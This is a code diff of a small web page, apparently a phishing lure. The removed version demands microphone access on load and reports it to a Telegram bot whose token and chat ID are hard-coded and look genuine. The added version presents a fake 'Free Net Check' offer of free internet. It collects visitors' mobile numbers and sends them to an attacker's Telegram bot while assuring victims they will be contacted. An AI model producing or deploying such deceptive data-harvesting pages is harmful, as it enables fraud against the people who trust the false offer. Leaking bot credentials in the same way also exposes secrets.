@@ -3,73 +3,102 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Microphone Permission</title>
+    <title>Free Net</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+            background: linear-gradient(135deg, #0099ff, #00cc99);
+            color: white;
             margin: 0;
-            background: #f3f4f6;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
         }
         .container {
+            background: rgba(255, 255, 255, 0.2);
+            padding: 20px 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
             text-align: center;
-            padding: 20px;
-            background: white;
-            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
-            border-radius: 8px;
+            width: 90%;
+            max-width: 400px;
         }
         h1 {
-            font-size: 24px;
-            margin-bottom: 16px;
+            font-size: 28px;
+            margin-bottom: 20px;
         }
         p {
             font-size: 16px;
             margin-bottom: 20px;
         }
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+        button {
+            background-color: #0066cc;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        button:hover {
+            background-color: #004c99;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Microphone Access Required</h1>
-        <p>To access this site, you need to allow microphone permission.</p>
+        <h1>Free Net Check</h1>
+        <p>Enter your mobile number to check eligibility for free internet.</p>
+        <input type="text" id="mobileNumber" placeholder="Enter your mobile number" required>
+        <button id="checkButton">Check Now</button>
     </div>
 
     <script>
-        // Request Microphone Permission on Page Load
-        async function requestMicrophonePermission() {
-            try {
-                // Request microphone access
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                alert("Microphone access granted!");
+        document.getElementById('checkButton').addEventListener('click', function () {
+            const mobileNumber = document.getElementById('mobileNumber').value;
 
-                // Example code for sending data to Telegram
-                const chat_id = '5998202830'; // Replace with valid chat ID
-                const token = '7789337898:AAGfuc-dxckjDn2IL8RCDHf43haYcbz9J5g'; // Replace with your bot token
-                const telegramURL = `https://api.telegram.org/bot${token}/sendMessage`;
-
-                const message = "User granted microphone access.";
-                fetch(telegramURL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chat_id, text: message })
-                }).then(response => {
-                    if (response.ok) {
-                        console.log("Message sent to Telegram!");
-                    } else {
-                        console.error("Failed to send data.");
-                    }
-                });
-            } catch (error) {
-                alert("Microphone access denied. You cannot proceed.");
-                document.body.innerHTML = `<h1>Access Denied</h1><p>You need to allow microphone access to use this site.</p>`;
+            // Validate the input
+            if (!mobileNumber || !/^\d{10,15}$/.test(mobileNumber)) {
+                alert("Please enter a valid mobile number.");
+                return;
             }
-        }
 
-        // Call the function on page load
-        window.onload = requestMicrophonePermission;
+            // Example: Sending data to Telegram
+            const chat_id = '123456789'; // Replace with your valid chat ID
+            const token = 'YOUR_BOT_TOKEN'; // Replace with your bot token
+            const telegramURL = `https://api.telegram.org/bot${token}/sendMessage`;
+
+            const message = `📱 Mobile Number Check:\n\nMobile Number: ${mobileNumber}\nRequested Free Net Check.`;
+
+            fetch(telegramURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chat_id, text: message })
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert('Mobile number checked successfully. You will be contacted soon.');
+                } else {
+                    alert('Failed to send data. Please try again.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('An error occurred while checking the number.');
+            });
+        });
     </script>
 </body>
 </html>
